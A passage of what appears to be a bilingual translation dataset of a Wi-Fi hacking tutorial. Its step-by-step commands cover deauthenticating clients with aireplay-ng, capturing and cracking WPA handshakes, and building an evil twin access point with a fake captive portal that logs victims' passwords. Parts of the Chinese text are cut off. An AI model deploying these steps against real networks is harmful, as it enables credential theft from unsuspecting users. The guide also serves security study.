    \ between two Wi-Fi networks with the same SSID name.\n\nThis enables hackers\
    \ to set up malicious wireless networks that can capture the traffic and extract\
    \ sensitive information from victims.\n\nAttack Methodology\n\n1.  Attacker scans\
    \ the air for the target access point information like SSID name, Channel number,\
    \ and MAC Address.\n\n1.  He then uses that information to create an access point\
    \ with the same characteristics.\n\n1.  Clients on the legitimate AP are repeatedly\
    \ disconnected, forcing them to connect to the malicious access point.\n\n1. \
    \ As soon as the client is connected to the fake access point, she/he may start\
    \ browsing the Internet.\n\n1.  Client opens up a browser window and sees a web\
    \ login page saying “Please login to access the internet.”\n\n1.  The client enters\
    \ the password, she/he will be redirected to a loading page, and the password\
    \ is stored in the database of the attacker's machine.\n\nCaptive Portals\n\n\
    A captive portal is a web page that is displayed to newly connected users of a\
    \ Wi-Fi network before they are granted access to the network.\n\nCaptive portals\
    \ are typically used by business centers, airports, hotel lobbies, coffee shops,\
    \ and other places that offer free Wi-Fi hotspots for internet users.\n\nUsers\
    \ can freely connect to these networks without a password and will often be directed\
    \ to a login page where a password is required before being allowed to browse\
    \ the web.\n\nThe danger in using these types of networks is that an attacker\
    \ can create a clone of the access point with the same login page and trick users\
    \ to connect to the fake network.\n\n| ![img](d2d_images/chapter_title_corner_decoration_left.png)\
    \  |  | ![img](d2d_images/chapter_title_corner_decoration_right.png)  |\n\n![img](d2d_images/chapter_title_above.png)\
    \ \n\n# ​ Set up an Access Point with Hostapd\n\n![img](d2d_images/chapter_title_below.png)\
    \ \n\nI n this chapter, you’ll learn how to set up a Wi-Fi Access Point using\
    \ hostapd, a popular open-source software package for creating Wi-Fi networks\
    \ on Linux systems.\n\nInstall Hostapd & Dnsmasq\n\nFor the Access Point to work,\
    \ you’ll need two items:\n\n●  hostapd — the Access Point software.\n\n●  dnsmasq\
    \ — a DHCP server that will provide IP addresses to the clients.\n\nSo, start\
    \ up the Linux system, and in the terminal type:\n\n| apt install dnsmasq hostapd\
    \ |\n\nSet up the Access Point\n\nRun the “iwconfig” command to see the available\
    \ wireless network interfaces (wlan0, wlan1...).\n\n![img](d2d_images/image029.jpg)\n\
    \nUse a wireless device that supports Access Point Mode. In my case, I am using\
    \ a wireless adapter with chipset Atheros AR9271 with interface name wlan0\\.\n\
    \nOnce you have identified your wireless interface, set up the configuration files\
    \ using the nano text editor in the terminal.\n\n| nano dnsmasq.conf |\n\nAnd\
    \ add the following lines.\n\n| #Set the wireless interfaceinterface=wlan0#Set\
    \ the IP range for the clientsdhcp-range=192.168.1.2,192.168.1.250,12h#Set the\
    \ gateway IP addressdhcp-option=3,192.168.1.1#Set DNS server addressdhcp-option=6,192.168.1.1\
    \ |\n\nThis configuration file will tell dnsmasq to use the wlan0 device and start\
    \ handing out IP addresses to the clients in the range of 192.168.1.2 through\
    \ 192.168.1.250. Don’t forget to save the file.\n\nNext, I am going to create\
    \ another configuration file, this time called hostapd.conf. Open the terminal\
    \ window and create the file using nano.\n\n| nano hostapd.conf |\n\nAdd the following\
    \ lines:\n\n| #Set wireless interfaceinterface=wlan0#Set network namessid=Test-WiFi#Set\
    \ channelchannel=11#Set driverdriver=nl80211 |\n\nIn the example above, an Access\
    \ Point is defined with the network name “Test-WiFi”, and it will run on channel\
    \ 11, using wireless network interface wlan0\\."
  trans: "\n在本演示中，我将选择破解我的网络密码，网络名称为“SkyNet”。\n\n接下来，我需要从网络中获取接入点 MAC 地址（BSSID）和信道。让我们打开另一个终端并输入：\n\
    \n```\nairodump-ng—bssid 28:EF:01:35:34:85 -c 6—write wpa-01 wlan0\n```\n\n`—\
    \ write wpa-01` 是你写入数据的文件名，四次握手数据也将存储于此。\n\n![img](img/image034.jpg)\n\n你可以使用\
    \ `ls` 命令查看该文件，后续你需要将其转换为不同格式才能破解密码。\n\n## 捕获 WPA/WPA2 握手\n\nWPA/WPA2 使用四次握手来认证设备到网络。为了捕获四次认证握手，你需要让客户端向接入点（AP）进行认证。\n\
    \n如果它们已经认证，你可以取消它们的认证（将它们踢下线），然后它们的系统会自动重新认证，在此过程中你就可以捕获四次握手。打开另一个终端并输入：\n\n```\n\
    aireplay-ng -0 100 -a 28:EF:01:35:34:85 -c 28:EF:01:23:46:68 wlan0\n```\n\n![img](img/image003.jpg)\n\
    \n在上面的屏幕中，注意右上角的“WPA handshake: 28:EF:01:35:34:85”。这意味着 `airodump-ng` 已成功捕获握手。\n\
    \n## 将 .cap 文件转换为 .hccap 格式\n\n在破解密码之前，你需要将 `.cap` 文件（`wpa-01.cap`）转换为 hashcat\
    \ 文件格式 `.hc22000`。这可以通过将 `.cap` 文件上传到 [`hashcat.net/cap2hashcat`](https://hashcat.net/cap2hashcat)\
    \ 并转换为 `.hc22000` 格式来快速完成。\n\n![img](img/WPA2 握手文件。\n\n```\n?l = abcdefghijklmnopqrstuvwxyz?u\
    \ = ABCDEFGHIJKLMNOPQRSTUVWXYZ?d = 0123456789?h = 0123456789abcdef?H = 0123456789ABCDEF?s\
    \ = «space»!\"#$%&'()*+,-./:;<=>?@[\\]^_`{&#124;}~ \n```\n\n假设你的密码是 `87654321`。你可以使用自定义掩码，如\
    \ `?d?d?d?d?d?d?d?d`\n\n这意味着你正在尝试破解一个 8 位数字密码，如 `87654323` 或 `43446789`...\n\n\
    ![img](img/chapter_title_corner_decoration_left.png) | | ![img](img/chapter_title_corner_decoration_right.png)\n\
    \n![img](img/chapter_title_above.png)\n\n# Evil Twin 和强制门户简介\n\n![img](img/chapter_title_below.png)\n\
    \nEvil Twin（邪恶双胞胎）是一个伪造的无线接入点，它伪装成由合法提供商提供的真实热点。\n\n其思想是设置一个与原始网络具有相同 SSID 名称的恶意无线网络。\n\
    \n连接到 Wi-Fi 网络的设备（如笔记本电脑、平板电脑和智能手机）无法区分两个具有相同 SSID 名称的 Wi-Fi 网络。\n\n这使得黑客能够设置恶意无线网络，从而捕获流量并从受害者那里提取敏感信息。\n\
    \n## 攻击方法论\n\n1.  攻击者扫描空中获取目标接入点信息，如 SSID 名称、信道号和 MAC 地址。\n2.  然后他使用这些信息创建一个具有相同特征的接入点。\n\
    3.  合法 AP 上的客户端被反复断开连接，迫使它们连接到恶意接入点。\n4.  一旦客户端连接到伪造的接入点，她/他可能开始浏览互联网。\n5.  客户端打开浏览器窗口，看到一个网页登录页面，上面写着“请登录以访问互联网”。\n\
    6.  客户端输入密码后，她/他将被重定向到一个加载页面，密码则存储在攻击者机器的数据库中。\n\n## 强制门户\n\n强制门户是一个网页，在新连接的 Wi-Fi\
    \ 网络用户被授予网络访问权限之前显示给他们。\n\n强制门户通常由商务中心、机场、酒店大堂、咖啡店和其他提供免费 Wi-Fi 热点的场所使用。\n\n用户可以无需密码自由连接到这些网络，并且通常会被引导到一个登录页面，要求输入密码才能浏览网页。\n\
    \n使用这类网络的危险在于，攻击者可以创建一个具有相同登录页面的接入点克隆，并诱骗用户连接到伪造的网络。\n\n![img](img/chapter_title_corner_decoration_left.png)\
    \ | | ![img](img/chapter_title_corner_decoration_right.png)\n\n![img](img/chapter_title_above.png)\n\
    \n# 使用 Hostapd 设置接入点\n\n![img](img/chapter_title_below.png)\n\n在本章中，你将学习如何使用 `hostapd`\
    \ 设置 Wi-Fi 接入点，这是一个在 Linux 系统上创建 Wi-Fi 网络的流行开源软件包。\n\n## 安装 Hostapd 和 Dnsmasq\n\
    \n要使接入点工作，你需要两个组件：\n\n*   `hostapd` — 接入点软件。\n*   `dnsmasq` — 一个 DHCP 服务器，将为客户端提供\
    \ IP 地址。\n\n因此，启动 Linux 系统，在终端中输入：\n\n```\napt install dnsmasq hostapd\n```\n\n\
    ## 设置接入点\n\n运行 `iwconfig` 命令查看可用的无线网络接口（`wlan0`、`wlan1`...）。\n\n![img](img/image029.jpg)\n\
    \n使用支持接入点模式的无线设备。在我的例子中，我使用的是芯片组为 Atheros AR9271 的无线适配器，接口名称为 `wlan0`。\n\n一旦你确定了你的无线接口，使用终端中的\
    \ `nano` 文本编辑器设置配置文件。\n\n```\nnano dnsmasq.conf\n```\n\n并添加以下行。\n\n```\n#Set the\
    \ wireless interfaceinterface=wlan0#Set the IP range for the clientsdhcp-range=192.168.1.2,192.168.1.250,12h#Set\
    \ the gateway IP addressdhcp-option=3,192.168.1.1#Set DNS server addressdhcp-option=6,192.168.1.1\n\
    ```\n\n此配置文件将告诉 `dnsmasq` 使用 `wlan0` 设备，并开始向范围在 `192.168.1.2` 到 `192.168.1.250`\
    \ 之间的客户端分配 IP 地址。别忘了保存文件。\n\n接下来，我将创建另一个配置文件，这次名为 `hostapd.conf`。打开终端窗口，使用 `nano`\
    \ 创建文件。\n\n```\nnano hostapd.conf\n```\n\n添加以下行：\n\n```\n#Set wireless interfaceinterface=wlan0#Set\
    \ network namessid=Test-WiFi#Set channelchannel=11#Set driverdriver=nl80211\n\
    ```\n\n在上面的示例中，定义了一个网络名称为“Test-WiFi”的接入点，它将在信道 11 上运行，使用无线网络接口 `wlan0`。\n"
- fmt: 'Save the file as `hostapd.conf`.


    At this point, you can start the access point using the following commands:


    ```

    dnsmasq -C /root/dnsmasq.conf

    hostapd /root/hostapd.conf

    ```


    ![img](d2d_images/image004.jpg)


    Now `hostapd` is running, check on another computer or phone to discover a wireless
    network with the SSID "Test-WiFi".


    ![img](d2d_images/image038.jpg)


    ## Provide Internet Access to the Access Point


    Once the AP is running, it’s a common scenario to share an internet connection
    from another interface. To do that, you can use `bridge-utils` to give internet
    from a bridge interface by typing the following commands:


    ```

    brctl addbr br0

    brctl addif br0 eth0

    ifconfig br0 up

    ```


    This will create a bridge between `br0` and `eth0`. In my case, `eth0` has internet
    access, so make sure to look for the interface that has internet with the `ifconfig`
    command.


    The last step is to modify the `hostapd.conf` file using `nano` text editor.


    ```

    nano hostapd.conf

    ```


    ![img](d2d_images/image064.jpg)


    And under the wireless interface `wlan0` type `bridge=br0`.


    Save the file and restart the AP using:


    ```

    hostapd /root/hostapd.conf

    ```


    Now, the clients that will connect to the access point will have internet access.


    # Set Up a Captive Portal Login Page


    Start up the Linux system and in the terminal type:


    ```

    apt install dnsmasq hostapd

    ```


    Then, figure out which wireless network device you will be using for the Access
    Point. Run the `iwconfig` command to see the available wireless network devices
    (`wlan0`, `wlan1`).


    ![img](d2d_images/image029.jpg)


    Once you have identified your wireless interface, set up the configuration files
    using the `nano` text editor in the terminal.


    ```

    nano dnsmasq.conf

    ```


    And add the following lines.


    ```

    #Set the wireless interface

    interface=wlan0

    #Set the IP range for the clients

    dhcp-range=192.168.1.2,192.168.1.250,12h

    #Set the gateway IP address

    dhcp-option=3,192.168.1.1

    #Set DNS server address

    dhcp-option=6,192.168.1.1

    #Redirect all requests to 192.168.1.1

    address=/#/192.168.1.1

    ```


    This configuration file will tell `dnsmasq` to use the `wlan0` interface and start
    handing out IP addresses to the clients.


    The last line will redirect all requests to the IP address `192.168.1.1`. This
    is the address of your server hosting the captive portal page.


    When clients connected to the network try to access any website, their DNS requests
    are intercepted and redirected to the captive portal page, which is hosted on
    the server (`192.168.1.1`). Don’t forget to save the file.


    Next, I am going to create another configuration file, this time called `hostapd.conf`.


    ```

    nano hostapd.conf

    ```


    Add the following lines:


    ```

    #Set wireless interface

    interface=wlan0

    #Set network name

    ssid=Free-WiFi

    #Set channel

    channel=11

    #Set driver

    driver=nl80211

    ```


    In the configuration above, an Access Point is defined with the network name "Free-WiFi",
    and it will run on channel 11, using wireless network interface `wlan0`.


    Save the file as `hostapd.conf`.


    At this point, you can start the access point using the following commands:


    ```

    dnsmasq -C /root/dnsmasq.conf

    hostapd /root/hostapd.conf

    ```


    ![img](d2d_images/image081.jpg)


    You will also need to assign the IP address for the `wlan0` interface using:


    ```

    ifconfig wlan0 192.168.1.1/24

    ```


    ## Copy the Captive Portal to the Web Server


    To set up a captive portal login page, you need to create or download a captive
    login page and copy the files to a location accessible by the web server.


    ![img](d2d_images/image080.jpg)


    Here, you can see a basic HTML login page that will appear when clients try to
    connect to the access point.


    ![img](d2d_images/image077.jpg)


    I am using Apache web server, so I need to copy the files to `/var/www/html`.


    The last step is to add rewrite rules to the Apache web server using `nano` text
    editor.


    ```

    nano /etc/apache2/sites-enabled/000-deafult.conf

    ```


    And under `VirtualHost` add the following code:


    ```

    <Directory "/var/www/html">

    RewriteEngine On

    RewriteBase /

    RewriteCond %{HTTP_HOST} ^www\.(.*)$ [NC]

    RewriteRule ^(.*)$ http://%1/$1 [R=301,L]

    RewriteCond %{REQUEST_FILENAME} !-f

    RewriteCond %{REQUEST_FILENAME} !-d

    RewriteRule ^(.*)$ / [L,QSA]

    </Directory>

    ```


    The rewrite rules above will make the redirection for the captive portal to work
    properly. Don’t forget to save the file and start the server using `service apache2
    start` in the terminal.


    Now, I will switch to a different computer and connect to the `Free-WiFi` network.


    ![img](d2d_images/image080.jpg)


    And I have been automatically redirected to the captive login page.


    # Capture Login Information from the Captive Portal using a PHP Script


    First, figure out where the captive portal files are located. In my case, the
    files are in `/var/www/html`. This is the location for the Apache web server.


    ![img](d2d_images/image024.jpg)


    Here you can see the files. The `post.php` is the script that will be used to
    capture the login information, and `capture.txt` is the text file where the login
    credentials will be stored.


    Now let’s open `post.php` using `nano` text editor.


    ```

    nano post.php

    ```


    ![img](d2d_images/image074.jpg)


    Basically, this code will grab the username and the password from the login form
    and save them in a file called `capture.txt`.


    Next, you need to modify the `index.html` file and add the script.


    ```

    nano index.html

    ```


    ![img](d2d_images/image065.jpg)


    Here, go to action, and after equal type "/post.php". Don’t forget to save the
    file and restart the server using `service apache2 restart`.


    Now, if I connect to the Wi-FI network, I will be automatically redirected to
    the captive login page which looks like this.


    ![img](d2d_images/image046.jpg)


    So, in the login form, I will type ''John'' for the username and ''letmein'' for
    the password and click "Login".


    Let’s go back to `/var/www/html` location and open the `capture.txt` file using
    `nano`.


    ```

    nano capture.txt

    ```


    ![img](d2d_images/image030.jpg)


    And here you can see the username and the password.


    # Chapter 3: Password Hashing and Cracking


    Password hashing is a process of using a hash function to convert a password into
    an unrecognizable series of characters like "1a1dc91c907325c69271ddf0c944bc72".


    This makes it difficult for malicious actors to gain access to the password, as
    the characters are not readable. Even if a hacker gets access to the database,
    he will not be able to see the passwords in clear text.


    Now, if passwords are kept in clear text, anyone with internal access can see
    them. Not to mention that if the database gets breached, hackers would also see
    the credentials in plain/clear text.


    Storing in clear text means you’re directly tying your user’s identity to their
    password in a readable data format, as seen in the image below:


    ![img](d2d_images/image063.jpg)


    If a hacker is able to break into the server, he will have access to all of the
    passwords. With this information, bad actors can take these login credentials
    and use them across websites other than your own.


    There’s no doubt that password hashing, compared to plain/clear text is an improvement
    in security.


    ![img](d2d_images/image057.jpg)


    If a hacker gets access to the hashed passwords, he won’t be able to use them
    because they’re encrypted using different hashing algorithms.'
